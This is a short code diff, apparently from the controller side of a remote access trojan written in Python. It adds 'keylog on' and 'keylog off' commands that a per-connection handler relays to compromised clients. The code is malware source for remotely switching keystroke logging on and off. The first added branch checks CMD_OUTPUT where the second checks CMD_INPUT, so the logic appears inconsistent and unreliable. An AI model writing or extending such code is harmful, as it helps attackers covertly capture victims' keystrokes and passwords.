@@ -68,7 +68,21 @@ def handle_connection(connection, address, thread_index):
                     else:
                         CMD_OUTPUT[thread_index] = 'some error occured'
                     
-                    
+                elif CMD_OUTPUT[thread_index] == 'keylog on':
+                    cmd = CMD_INPUT[thread_index]
+                    connection.send(cmd.encode())
+                    msg = connection.recv(2048).decode()
+                    CMD_OUTPUT[thread_index] = msg
+                    CMD_INPUT[thread_index] = ''
+                
+                elif CMD_INPUT[thread_index] == 'keylog off':
+                    cmd = CMD_INPUT[thread_index]
+                    connection.send(cmd.encode())
+                    msg = connection.recv(2048).decode()
+                    CMD_OUTPUT[thread_index] = msg
+                    CMD_INPUT[thread_index] = ''
+
+
                 else:
                     msg = CMD_INPUT[thread_index]
                     connection.send(msg.encode())
